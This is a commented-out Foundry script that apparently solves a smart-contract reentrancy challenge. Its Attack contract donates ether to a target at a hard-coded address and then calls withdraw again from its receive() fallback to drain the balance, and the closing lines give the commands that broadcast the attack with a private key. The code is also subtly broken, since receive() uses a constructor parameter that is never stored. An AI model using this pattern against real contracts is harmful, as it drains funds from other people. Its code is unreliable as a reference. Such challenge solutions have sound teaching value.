// // SPDX-License-Identifier: UNLICENSED
// pragma solidity ^0.6.12;

// import {Script, console} from "forge-std/Script.sol";
// import {Reentrancy} from "../src/Reentrancy.sol";

// contract Attack {
//     constructor(Reentrancy _reentrancy) payable {
//         _reentrancy.donate{value: 1 ether}(address(this));
//         _reentrancy.withdraw(1);
//     }

//     receive() external payable {
//         _reentrancy.withdraw(1);
//     }
// }

// contract ReentrancyHack is Script {
//     Reentrancy public reentrancy =
//         Reentrancy(payable(0xe6908ceB91AB06c731bD7ba36E3cE75286ca0c0F));

//     function run() public {
//         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

//         new Attack{value: 1 ether}(reentrancy);

//         // console.log("Reentrancys after hack", reentrancy.locked());

//         vm.stopBroadcast();
//     }
// }

// // forge script script/Reentrancy.s.sol -vv --tc ReentrancyHack
// // forge script script/Reentrancy.s.sol -vv  --broadcast --tc ReentrancyHack
